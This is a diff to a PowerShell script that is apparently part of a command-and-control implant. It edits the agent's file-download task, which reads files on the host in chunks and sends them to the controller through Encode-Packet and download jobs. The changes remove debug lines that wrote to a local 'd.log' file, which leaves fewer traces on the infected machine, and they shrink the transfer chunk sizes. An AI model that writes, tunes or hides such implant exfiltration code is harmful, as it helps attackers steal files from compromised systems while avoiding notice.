@@ -994,9 +994,9 @@ function Get-FilePart {
             }
             # file download
             elseif($type -eq 41) {
-                "In Download task" | Out-File -Append "d.log"
+                
                 try {
-                    $ChunkSize = 256KB
+                    $ChunkSize = 64KB
 
                     $Parts = $Data.Split(" ")
 
@@ -1025,8 +1025,8 @@ function Get-FilePart {
                     if($ChunkSize -lt 32KB) {
                         $ChunkSize = 32KB
                     }
-                    elseif($ChunkSize -gt 8MB) {
-                        $ChunkSize = 8MB
+                    elseif($ChunkSize -gt 4MB) {
+                        $ChunkSize = 4MB
                     }
 
                     # resolve the complete path
@@ -1034,7 +1034,7 @@ function Get-FilePart {
 
                     # read in and send the specified chunk size back for as long as the file has more parts
                     $jobID = Start-DownloadJob -ScriptString $Download -type $type -Path $Path -ResultID $ResultID -ChunkSize $ChunkSize
-                    "Called Start-DownloadJob: $jobID" | Out-File -Append "d.log"
+                    
                 }
                 catch {
                     Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID
@@ -1308,11 +1308,11 @@ function Get-FilePart {
             if(Get-DownloadJobCompleted -JobName $JobName) {
                 # the job has stopped, so receive results/cleanup
                 $Results = Stop-DownloadJob -JobName $JobName
-                "Job $JobName complete: size - $($Results.Length)" | Out-File -Append "d.log"
+                
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                "Job $JobName data received: size - $($Results.Length)" | Out-File -Append "d.log"
+                
                 
             }
 
